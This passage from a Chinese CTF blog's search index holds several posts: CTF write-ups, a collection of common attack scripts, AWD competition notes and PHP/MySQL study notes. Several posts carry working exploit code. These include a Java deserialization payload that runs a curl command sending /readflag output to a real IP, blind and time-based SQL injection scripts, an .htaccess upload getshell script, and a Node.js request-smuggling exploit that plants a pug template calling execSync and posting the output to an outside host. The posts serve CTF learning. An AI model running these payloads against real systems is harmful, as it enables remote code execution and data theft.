这个函数当参数是/开始, 就不能穿越到更高的目录, 也就是最多在/WEB-INF/同级, 包含不到/tmp目录, 能用的只有下面的任意文件读了 1in = new FileInputStream(filename); 但是这题是需要RCE的, 有个/readflag 这个题做了一天, 都没有进展, 尝试了很多后缀名, 但是都无法解析 AK这辈子都不可能AK的 解题临近结束的时候看到了洞hhh 在Tools类的这里 其实就是个后门, 但是一直没注意到(x, 要利用这个函数的话, 我们需要反序列化一个Tools类 然后问题就来了, 打到比赛结束一直没成功, 和@杨大树以及@P3rh4ps两位师傅交流了一下, 可以通过重写writeObject方法来实现 或者这里也可以直接写 道理都是一样的, 都是通过构造一个String[]对象来传给ProcessBuilder进行执行, 执行的部分则是将需要空格分隔的地方, 分隔成不同的字符串, 例如 12/bin/sh -c \"curl http://ip:port/`/readflag`\"{\"/bin/sh\", \"-c\", \"curl http://ip:port/`/readflag`\"} 完整的exp如下 Tools.java12345678910111213141516171819202122232425262728293031package com.tools;import java.io.*;public class Tools implements Serializable { private static final long serialVersionUID = 1L; public static Object parse(byte[] bytes) throws Exception { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); } private String[] testcall={\"/bin/sh\",\"-c\",\"curl http://174.0.218.211:2333/`/readflag`\"}; public static byte[] create(Object obj) throws Exception { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[]) obj)).start(); } private void writeObject(ObjectOutputStream out) throws IOException { String[] cmd = {\"/bin/sh\",\"-c\",\"curl http://174.0.218.211:2333/`/readflag`\"}; out.writeObject(cmd); }} 生成的部分 exp.java1234567891011121314151617import java.io.*;import java.util.Base64;import com.tools.*;public class exp { public static void main(String[] args) { Base64.Encoder encoder = Base64.getEncoder(); try { Tools cinfo = new Tools(); byte[] bytes = Tools.create(cinfo); String payload = encoder.encodeToString(bytes); System.out.println(payload); } catch (Exception e) { e.printStackTrace(); } }} 重新下发了一个环境, 将生成的部分放到cookie, 就可以接受flag了 或者将输出写到/tmp/下, 然后通过任意文件读拿flag也可 再次感谢两位师傅的帮助和赵师傅的题目 本文作者: cjm00n本文地址: https://cjm00n.top/2020/02/29/V-N公开赛2020-writeup/ 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。","link":"/2020/02/29/V-N%E5%85%AC%E5%BC%80%E8%B5%9B2020-writeup/"},{"title":"常用脚本","text":"记录一下常用的一些脚本 SQL二分盲注1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import requestsfrom time import sleepurl = \"http://8fd845b8-4242-4441-ab34-57c8386d5faf.node3.buuoj.cn/backend/content_detail.php\"proxies = { \"http\": \"127.0.0.1:8080\"}def attack(cur, mid=\"\"): # payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,0)\" % (cur, mid) # payload = \" or length((select group_concat(password) from users))={}#\".format(cur) # 一开始把#写成%23, 结果一直不对, 后面才想起python会自动编码... # payload = \" or if(ascii(substr((select group_concat(password) from users),%d,1))>%d,1,0)#\" % (cur, mid) # payload = \"0^(ascii(substr(((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database()))),%d,1))>%d)\" % (cur, mid) payload = \"0^(ascii(substr((select(group_concat(password))from(admin)),%d,1))>%d)\" % (cur, mid) data = { \"id\": payload } res = requests.get(url, params=data, proxies=proxies) # print(res.text) if res.status_code == 429: print('too fast') if \"content\" in res.text: return True else: return Falsedef try_length(): for i in range(1, 10): if attack(i): print(i) break sleep(0.02)def main(): flag = \"\" for i in range(1, 22): end = 127 start = 31 mid = (end + start) // 2 while end > start: if attack(i, mid): start = mid + 1 else: end = mid mid = (end + start) // 2 sleep(0.02) flag += chr(mid) print(flag)if __name__ == \"__main__\": # try_length() main() SSTI判断图 .htaccess上传getshell1234567891011121314151617181920212223242526import requestsimport base64url = r\"http://2eab5f94-4cfd-41dc-ac5d-6cda977d7ce4.node3.buuoj.cn//?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&%fe=get_the_flag\"# SIZE_HEADER = b\"#define width 1\\n#define height 1\\n\\n\"SIZE_HEADER = b\"\\x00\\x00\\x8a\\x39\\x8a\\x39\"htaccess = SIZE_HEADER + b\"\"\"AddType application/x-httpd-php .ccphp_value auto_prepend_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/shell.cc\"\"\"\"files = [ (\"file\",(\".htaccess\", htaccess, \"image/gif\"))]proxy = {\"http\": \"127.0.0.1:8080\"}res = requests.post(url, files=files, proxies=proxy).textprint(res)shell = SIZE_HEADER + b\"00\" + base64.b64encode(b\"\")files = [ (\"file\",(\"shell.cc\", shell, \"image/gif\"))]proxy = {\"http\": \"127.0.0.1:8080\"}res = requests.post(url, files=files, proxies=proxy).textprint(res) 本文作者: cjm00n本文地址: https://cjm00n.top/2020/02/16/常用脚本/ 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。","link":"/2020/02/16/%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC/"},{"title":"Xman结营赛AWD总结","text":"Xman20天结束了, 感谢各路大佬抬我一手, 第二次打AWD, 虽然还是很菜, 但总不至于毫无输出了, 膜一波@q4n和@Cosmos, 由于总结的时候已经过去两天了, 当时的图都没留下来, 很多地方大家就意会一下吧我还是觉得这个赛制很神奇, 竟然有可以打自己出的题的比赛 准备还是太浪了, 结营赛前一天才开始准备, 本来想上@王一航师傅的框架 AWD Framework , 但是准备的比较晚没搞懂, 就还是上网找了散装脚本用了, 后面会把用到的脚本罗列一下 比赛前一晚还搭好了hackmd, 但是没有整明白虚拟机的网络配置..只能我自己连上去, 导致比赛的过程交流都是物理交流了hhhh 文件交流1234# python2python -m SimpleHTTPServer 8000# python3python -m http.server 8000 文档交流推荐使用codimd 搭建方法参考 https://hackmd.io/c/codimd-documentation/%2Fs%2Fcodimd-docker-deployment 装好了docker和docker-compose只需要三行命令 123git clone https://github.com/hackmdio/docker-hackmd.gitcd docker-hackmddocker-compose up 然后访问localhost:3000即可 图片上传的部分需要进去docker里面修改一下, 默认是imgur图床 1234567# 进入容器, 需要对应containeriddocker exec -it containerid /bin/bash# 安装vimapt update && apt install vim# 修改vim config.json#修改imageuploadtype为filesystem 然后就可以正常传图片了 虚拟机的网络设置需要改成桥接模式, 这样才能和主机在同一个段, 局域网内可以正常访问 比赛登录比赛开始的时候发了账号密码, 登录上去一直看不到赛题信息, 还以为是网络问题, 后面问了才发现是广告插件的问题 , 关闭广告插件就可以看到了 关闭广告拦截插件 然后下载赛题信息, 里面有ip和ssh的公私钥 第一次连, 差点不会连, 还好MobaXTerm的界面设计的不错, 一眼就看到了在哪里添加 输入host和username(这里是xman) 勾选 Use private Key 选择不带后缀的私钥 id_rsa 然后就可以登录上去了 弱密码这里主要涉及的是 ssh密码 mysql密码 phpmyadmin密码 etc 不过这部分暂时还没找到相关的脚本, 师傅们有的话可以来交流一下 ssh先登录上去, 之后 1passwd 输入密码即可, 改完自己的直接开始打 这里可以用@p0desta师傅的框架 awd-attack 不过没有集成修改ssh密码的功能, 后面再自己改一下吧 数据库12mysql>set password=password('new');mysql>flush privileges; 没改的话上去就可以删库跑路了hhh 备份备份还是大意了, 比赛前想过备份数据库, 连命令都准备好了, 结果上去就忘记了, 导致web9从开始就宕机宕到结束 (自己背锅 下面的备份都是备份到家目录 源码备份这里有个注意的点是, 如果不先进入html文件夹的话, 备份后的压缩包会包含整个路径 12# 不建议tar -zcvf ~/html.tar.gz /var/www/html/ 下面的命令压缩后结构如下 12cd /var/www/htmltar -zcvf ~/html.tar.gz * 如果需要恢复则可以使用下面的命令 12rm -rf /var/www/htmltar -zxvf ~/html.tar.gz -C /var/www/html 或者 123cd /var/www/htmlrm -rf *tar -zxvf ~/html.tar.gz 数据库备份先在html文件夹里面搜索一下数据库的用户名和密码 12cd /var/www/htmlfind .|xargs grep \"password\" , 然后开始备份 12345678#mysql终端下可以先看一下有什么数据库mysql>show databases;# 备份相应的数据库mysqldump -u 用户名 -p 数据库名>~/back.sql# 备份全部数据库mysqldump -u root -p --all-databases >~/back.sql# 跳过锁定的数据库表mysqldump -u root -p --all-databases —skip-lock-tables >~/back.sql 恢复的话, 需要先建好相应的数据库 1234cd mysql>create database xxx;mysql>use xxx;mysql>source back.sql; 或者在终端下 12cdmysql -u root -p xxx $value) { $files[$key][‘content’] = file_get_contents($_FILES[$key][‘tmp_name’]); file_put_contents($_FILES[$key][‘tmp_name’], “virink”); }unset($header[‘Accept’]);$input = array(“Get”=>$get, “Post”=>$post, “Cookie”=>$cookie, “File”=>$files, “Header”=>$header);logging($input);}function logging($var){ $filename = $_SERVER[‘REMOTE_ADDR’];$LOG_FILENAME = LOG_FILEDIR.”/”.$filename;$time = date(“Y-m-d G:i:s”);file_put_contents($LOG_FILENAME, “\\r\\n”.$time.”\\r\\n”.print_r($var, true), FILE_APPEND); file_put_contents($LOG_FILENAME,”\\r\\n”.’http://’.$_SERVER[‘HTTP_HOST’].$_SERVER[‘PHP_SELF’].’?’.$_SERVER[‘QUERY_STRING’], FILE_APPEND);file_put_contents($LOG_FILENAME,”\\r\\n***************************************************************”,FILE_APPEND);}waf(); ?> 自动上waf的脚本, 这个脚本需要注意的是, waf的路径必须是绝对路径, 因为是递归添加waf, 如果不是绝对路径, 内层文件夹的php文件无法找到waf的路径, 服务就会宕掉, 但是如果全部上的话, 就算上对了还是有可能出现宕机, 这个与namespace有关, 可以了解一下, 如果是常见的cms可以上在入口的php中, 就能监听到流量了 1234567891011121314151617181920212223242526272829#-*- coding:utf-8 -*'''批量添加WAF的python脚本'''import osbase_dir = '/var/www/html' #web pathdef scandir(startdir) : os.chdir(startdir) for obj in os.listdir(os.curdir) : path = os.getcwd() + os.sep + obj if os.path.isfile(path) and '.php' in obj and 'log' not in path: modifyip(path,'","link":"/2019/08/22/Xman%E7%BB%93%E8%90%A5%E8%B5%9BAWD%E6%80%BB%E7%BB%93/"},{"title":"php和mysql开发笔记","text":"学习php圣经的笔记 第一章 快速入门php两种标记123// 取决于php.ini中'short_open_tag'选项, 默认不开启 双引号和单引号中的变量单引号不解析php变量, 双引号则会解析变量值 12345$a = 1;echo \"a=$a\";//> a=1;echo 'a=$a';//> a=$a heredoc语法通过标志(theEnd)来作为关闭标记, 只需要保证不会出现在文本中 123456789echo intsettype($a, 'float');echo gettype($a);//> float 第二章 数据存储和读取文件读写读写模式 模式 模式名称 意义 r 读 从头开始读, 加上+表示读写 w 写 不存在文件时会创建文件, 存在时则会清空并从头开始写, 加上+表示读写 x 谨慎写 如果文件不存在则会返回false并抛出错误, 其他同w b 二进制 win会区分二进制文件和文本文件, linux则不会区分, 推荐使用 a 追加 不存在文件时会创建文件, 存在时则从文件尾部开始写, 加上+表示读写 t 文本 win下的一个选项, 不推荐使用 分隔符1234//winfopen(\"c:\\\\flag\",\"r\");//win and linux, 推荐fopen(\"../flag\",\"r\"); 写文件12345$fp = fopen(\"log.txt\", \"ab\");fwrite($fp, \"aaa\");file_put_contents(\"log.txt\", \"aaa\");fputs($fp, \"aaa\");fclose($fp); 读文件123456789101112131415161718// 判断文件末尾, file end of filewhile(!feof($fp)){...};// 读字符while(!feof($fp)){ $char = fgetc($fp); if(!feof($fp)){ echo ($char == \"\\n\" ? \"\":$char); }}// 读一行fgets/fgetss/fgetcsv// 读任意长fread()// 读文件readfile($filename);fpassthru($fp);file($filename);//返回数组, 按行分割file_get_contents($filename);//返回文件内容, 不输出 其他文件操作12345678910// 判断文件存在file_exists($filename);// 获取文件大小filesize($filename);// 删除文件unlink($filename);// 文件指针定位rewind()/fseek()/ftell();// 文件锁flock(); 第三章 数组创建数组数组支持在结尾添加元素 12345678910// array$pro = array('Tires', 'Oil', 'Spark');$pro = array('Tires' => 100, 'key' => value);// since php5.4$pro = ['Tires', 'Oil', 'Spark'];$pro[3] = 'Plugs';// 多维数组$multi_pro = array(array('tires', 100), array('Spark', 99) ); 访问数组12$pro[0];$pro{1}; 循环123for($i = 0; $i < 3; $i++){..}foreach($pro => $value){...} //foreach($pro as $key => $value){...} // 数组排序123456789101112// 字典序,区分大小写sort()asort() ksort()// 反序rsort()arsort() krsort()// 自定义序usort($array, $func)// 数组随机shuffle()// 数组逆序array_reverse() 数组操作进出数组12array_push($array, $item);array_pop($array);//删除末尾 数组浏览123456789101112// 返回当前元素并指向下一个元素each()// 指向下一个元素并返回新的元素next()// 返回当前元素current()// 返回指向第一个元素的指针reset// 返回指向最后一个元素的指针end()// 指向上一个元素并返回新的元素prev() 统计数组1234// 返回元素个数count()/sizeof()// 返回每个特定值在数组中出现的次数, 返回值为数组array_count_values() 其他操作1234567// maparray_walk($array, $func, [userdata]);// 其中func定义为func($value, $key, $userdata); // 解析数组为变量, 不安全extract($array); 第四章 字符串字符串截断123456// 除去开始和结束的空格trim()// 除去开始的空格ltrim()// 除去结束的空格rtrim()/chop() html转换1234// html字符过滤htmlspecialchars();// /n => n2br(); 大小写123456strtoupper()strtolower();// 每个字符串首字母大写ucfirst();// 每个单词首字母大写ucwords() 格式化输出1%[+]['padding_character][-][width][.precision]type + 表示正数输出 + padding_character 表示输出前缀, 除0和外都需要添加` -表示左对齐 width表示宽度 .precision表示小数点后位数 类型 意义 b 解释为整数并作为二进制输出 c 解释为整数并作为字符输出 d 解释为整数并作为小数输出 e 解释为双精度并以科学计数法打印, 精度是小数点后的数字个数 E 同e, 打印为大写E f 解释为双精度并作为浮点数输出 F 解释为浮点数并打印与locale无关的浮点数 g 转换规范类型e或f的简短输出 G 转换规范类型E或F的简短输出 o 解释为整数并作为8进制输出 s 解释为字符串输出 u 解释为整数并作为非指定小数输出 x 解释为整数并作为16进制小写输出 X 解释为整数并作为16进制大写输出 字符串连接切分1234// 切分explode($separator, $string);// 连接implode($separator, $array)/join(); 子串1234// strtok// start和length都可以是负数, 当length为负数时表示结束位置(end)substr($strings, start, [length]); 比较123456// 区分大小写strcmp()// 不区分大小写strcasecmp()// 自然序, 2 匹配$b = \"blah baa black sheep\";//> 不匹配 正则分割1234print_r(preg_split(\"/\\.|@/\", \"user@admin.cn\"));//> user admin cn 第五章 代码重用和函数auto_prepend_file1234567// php.iniauto_prepend_file = \"/path/to/header.php\";auto_append_file = \"/path/to/footer.php\";// .htaccess, 目录中每次每个文件都要进行处理, 性能较低php_value auto_prepend_file \"/path/to/header.php\"php_value auto_append_file \"/path/to/footer.php\"// 考虑安全问题可以使用readfile读入而不会自动解析代码 闭包闭包函数具有对全局作用域变量的访问, 但必须在闭包函数定义中使用use关键字显式定义 第六章 面向对象类属性修饰符默认为public private不可被继承, protected可以被继承 final关键字用于禁止类被继承或者函数被覆盖 不支持多重继承单一继承, 但是可以支持类似java的interface12345678interface Displayable{ function display();}class Test implements Displayable{ function display(){ ... }}或者使用Trait, 注意Trait会覆盖类继承的同名方法, 而类中自定义的方法可以覆盖Trait的方法123456789trait logger{ public function logmessage($message){ ... }}class Test{ use logger; // this->logmessage();}如果使用了多个同名的Trait, 需要用insteadof声明所使用的函数 灵活的使用标记当程序中需要大段的打印html代码时, 可以使用如下的方法12345 html... 第八章 web数据库设计避免保存冗余数据, 当冗余数据过多会出现修改, 插入和删除异常 避免出现大量空值 第九章 Web数据库创建安装步骤 安装文件 如果需要, 创建并设置MySQL的运行用户 设置路径 如果需要, 运行mysql_install_db 设置root用户密码 删除匿名用户和测试数据库 启动MySQL并设置为自动运行 大小写sql语句不区分大小写, 数据库名称和表名称区分大小写(linux下) 创建用户创建用户可以使用 1create user user_info identified by password; 或者使用grant自动创建用户 12-- since mysql 5.5.7grant privileges on item to user_info identified by password; 权限大部分情况下, php脚本只需要select, insert, update, delete操作 可以通过grant授予和revoke取回, 部分权限如file具有极大的安全问题 如果所运行的grant语句已经执行, 但是尝试登陆时被拒绝, 通常是因为安装中的匿名用户没有被删除 查看数据库1234-- 查看所有数据库show databases;-- 显示数据库结构describe database_name; 部分类型当读取char类型或者写入varchar数据时, mysql将过去结尾处多余的空格 blob, 二进制大对象, 可以用来存储图像声音数据等 本文作者: cjm00n本文地址: https://cjm00n.top/2019/11/24/php和mysql开发笔记/ 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。","link":"/2019/11/24/php%E5%92%8Cmysql%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"},{"title":"新春公益赛2020wp","text":"有一两道挺有意思的 简单的招聘系统很坑, 一开始下发的环境不对, 日了半天 万能密码绕过+union注入 babyphp改自[0ctf 2016] piapiapia, 具体的思路是反序列化逃逸和pop链构造 首先是反序列化逃逸 1234function safe($parm){ $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\"); return str_replace($array,'hacker',$parm);} 具体的分析可以找原题看一下, 反序列化逃逸有这两种方向 替换后变长, 在value的部分构造逃逸, 如本题和piapiapia 替换后变短, 在key的部分构造, 如[axb 2019]easy_serialize_php 然后就是反序列化链的构造 nickname可控, 然后寻找__destruct 有个echo, 可以用来触发__toString, 其实本题还有一个__destruct, 但是比较坑 首先存在过滤flag, 无法读取flag.php, 其次没有输出点, 读了也没用 我们继续找找__toString 会调用一个update函数, 对于函数调用我们有两种处理方法 寻找带有这个函数的类 寻找__call方法 因为这个update还是空的 我们就找__call 有个login的调用, 这个就是我们想要的了, 看一下这个函数 sql用的是PDO方法, 一般没有sql注入, 但是这里会返回一个$idResult, 也就是第一列的结果, 而前面的调用还有个echo, 也就是能够回显第一列的结果, 我们就可以利用这个来注出密码 exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051CtrlCase = $o;$u = new User();$u->nickname = $i;$h = new UpdateHelper();$h->sql = $u;$f = new Info();$f->CtrlCase = $h;$s = serialize($f);assert($s===safe($s));$s = substr($s,47);$len = strlen($s);$res = \"\";for($dd=0;$dd, query(\"select balabala from table1\"); $res = $test->fetch(PDO::FETCH_ASSOC); $id = $res['balabala']; } if(check($id)) { $query = \"select balabala from table1 where 1=?\"; $db->query(\"set names gbk\"); $row = $db->prepare($query); $row->bindParam(1,$id); $row->execute(); } 盲注, exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142import requestsfrom Crypto.Util.number import long_to_bytes, bytes_to_longfrom libnum import s2nimport stringimport reurl = \"http://e0bac4dbfc61452b906f16cacbe31e9bfe43db0e990f4ace.changame.ichunqiu.com/\"pattern = re.compile(\"union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\\^|&|database\", re.I)def gen(payload, pos, num): \"\"\" SET @SQL=0x73656c65637420646174616261736528293b;PREPARE pord FROM @SQL;EXECUTE pord;\"\"\" res = \"%bf%27;SET @x=\" + (hex(s2n(payload % (pos, num)))) + \";PREPARE xx FROM @x;EXECUTE xx;/*\" # print(res) if pattern.match(res): print(\"match\") exit(0) return resdef exp(): # payload = \"select if((ascii(substr(reverse((select group_concat(table_name) from information_schema.tables where table_schema=database())),%d,1))>%d),0,sleep(4));\" payload = \"select if((ascii(substr(reverse((select fllllll4g from pdotest.table1)),%d,1))>%d),0,sleep(4));\" res = \"\" for i in range(1,60): start = 32 end = 128 mid = (end + start) // 2 while end > start: params = { \"id\": gen(payload, i, mid) } try: requests.get(url+\"?id=\"+params['id'], timeout=2) start = mid + 1 except: end = mid mid = (end + start) // 2 res = chr(mid) + res print(res) # print(f\"{i}: {res}\") if __name__ == \"__main__\": exp() 改进了一个多线程版本, 一分钟不到就可以注出结果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import requestsfrom libnum import s2nimport stringimport refrom multiprocessing.pool import ThreadPoolurl = \"http://e0bac4dbfc61452b906f16cacbe31e9bfe43db0e990f4ace.changame.ichunqiu.com/\"pattern = re.compile(\"union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\\^|&|database\", re.I)res = [\"\" for i in range(60)]def gen(payload, pos, num): \"\"\" SET @SQL=0x73656c65637420646174616261736528293b;PREPARE pord FROM @SQL;EXECUTE pord;\"\"\" res = \"%bf%27;SET @x=\" + (hex(s2n(payload % (pos, num)))) + \";PREPARE xx FROM @x;EXECUTE xx;/*\" # print(res) if pattern.match(res): print(\"match\") exit(0) return resdef exp(i): # payload = \"select if((ascii(substr(reverse((select group_concat(table_name) from information_schema.tables where table_schema=database())),%d,1))>%d),0,sleep(4));\" payload = \"select if((ascii(substr(((select fllllll4g from pdotest.table1)),%d,1))>%d),0,sleep(4));\" # for i in range(1,60): if i: start = 32 end = 128 mid = (end + start) // 2 while end > start: params = { \"id\": gen(payload, i, mid) } try: requests.get(url+\"?id=\"+params['id'], timeout=2) start = mid + 1 except: end = mid mid = (end + start) // 2 res[i] = chr(mid) print(\"\".join(res)) # print(f\"{i}: {res}\") if __name__ == \"__main__\": pool = ThreadPool(5) for i in range(45): pool.apply_async(exp, (i, )) # exp() pool.close() pool.join() black_listhttps://skysec.top/2019/12/13/2019-FudanCTF-Writeup/ 飘零师傅tql ezsqli这道题过滤了很多东西, 主要参考的是出题人的博客 https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/ 由于我们没有union, 无法使用常规的无列名注入, 找了很多资料, 只有smi1e师傅的这个payload可用 1234567891011121314151617mysql> SELECT * FROM USERS WHERE ID =1;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | 123 | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql> SELECT * FROM USERS WHERE ID = ((select 1,123,'Dumb') SELECT * FROM USERS WHERE ID = ((select 2,123,'Dumb') { res.send(e.message);}); }); } catch (error) { console.log(error); } } } else { res.send(\"search param 'q' missing!\"); }})function blacklist(url) { var evilwords = [\"global\", \"process\",\"mainModule\",\"require\",\"root\",\"child_process\",\"exec\",\"\\\"\",\"'\",\"!\"]; var arrayLen = evilwords.length; for (var i = 0; i < arrayLen; i++) { const trigger = url.includes(evilwords[i]); if (trigger === true) { return true } }}var server = app.listen(8081, function() { var host = server.address().address var port = server.address().port console.log(\"Example app listening at http://%s:%s\", host, port)}) 考点是ssrf, 而这里利用的是 https://xz.aliyun.com/t/2894 在nodejs8.12.0这个版本中, 程序在底层处理的时候会舍弃高位的字符, 只保留低位的字符, 也就是说 假如我们传入 1chr(0xffa0) 处理后会被截断为 1chr(0xa0) 那么我们就可以利用这个特点来进行编码绕过, 方法如下 12def exp_code(word): return quote(''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in word)) 其中的0xff可以随意设定, 不会影响结果 然后再利用http走私攻击, 向程序发送两个请求, 这里在构造数据包的时候需要将\\n替换为\\r\\n, 否则将无法识别为正常的请求包 1payload.replace(\"\\n\", \"\\r\\n\") 接着我们就可以构造请求类似这样 12345678910111213141516171819202122 HTTP/1.1Host: xConnection: keep-alivePOST /file_upload HTTP/1.1Host: xContent-Length: 193Origin: http://123.57.212.112:33322Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryL3EANY7czeEB7XdWConnection: keep-alive------WebKitFormBoundaryL3EANY7czeEB7XdWContent-Disposition: form-data; name=\"file\"; filename=\"cjm22n.pug\"Content-Type: text/javascriptbaaaaaa------WebKitFormBoundaryL3EANY7czeEB7XdW--GET /flag HTTP/1.1Host: xConnection: closex: 大概这样的请求来进行绕过, 再看程序上传的流程 文件目录在 1/upload/minetype/ 如果我们使得minetype为 1../template 就可以将文件写入模板目录中, 再通过 这里进行任意访问, 首先需要rce, 我们可以通过pug模板的 1- global.process.mainModule.require('child_process').execSync('evalcmd') 来执行命令, 编写exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445import requestsfrom urllib.parse import quoteurl = \"http://182.92.243.154:33323/\"def upload(cmd): payload = ''' HTTP/1.1Host: xConnection: keep-alivePOST /file_upload HTTP/1.1Host: xContent-Length: 304Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBOpB7RbAKnIckY80Connection: keep-alive------WebKitFormBoundaryBOpB7RbAKnIckY80Content-Disposition: form-data; name=\"file\"; filename=\"cjm00n.pug\"Content-Type: ../template- global.process.mainModule.require('child_process').execSync('curl http://ip:port/ -X POST -d `evalcmd`')------WebKitFormBoundaryBOpB7RbAKnIckY80--GET /flag HTTP/1.1Host: xConnection: closex: ''' payload = payload.replace(\"\\n\", \"\\r\\n\").replace(\"evalcmd\", cmd).replace(\"304\", str(297 + len(cmd))) payload = ''.join(chr(int('0xee' + hex(ord(c))[2:].zfill(2), 16)) for c in payload) params = { \"q\": payload } requests.get(f\"{url}core\", params=params,) try: requests.get(f\"{url}?action=cjm00n\", timeout=2) except: print(\"done\") # print(res)def exp_code(word): return quote(''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in word))if __name__ == \"__main__\": upload(\"cat /flag.txt\") # print(exp_code(\"`\")) 使用的时候替换一下ip和port, 以及重新计算一下Content-Length 本文作者: cjm00n本文地址: https://cjm00n.top/2020/02/24/新春公益赛2020wp/ 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。","link":"/2020/02/24/%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B2020wp/"}],"tags":[{"name":"AWD","slug":"AWD","link":"/tags/AWD/"},{"name":"Writeup","slug":"Writeup","link":"/tags/Writeup/"},{"name":"Config","slug":"Config","link":"/tags/Config/"},{"name":"Web开发","slug":"Web开发","link":"/tags/Web%E5%BC%80%E5%8F%91/"},{"name":"CSRF","slug":"CSRF","link":"/tags/CSRF/"},{"name":"HackTheBox","slug":"HackTheBox","link":"/tags/HackTheBox/"},{"name":"Script","slug":"Script","link":"/tags/Script/"}],"categories":[{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"Linux","slug":"Linux","link":"/categories/Linux/"},{"name":"Web","slug":"Web","link":"/categories/Web/"},{"name":"Pentest","slug":"Pentest","link":"/categories/Pentest/"},{"name":"Blog","slug":"Blog","link":"/categories/Blog/"}]}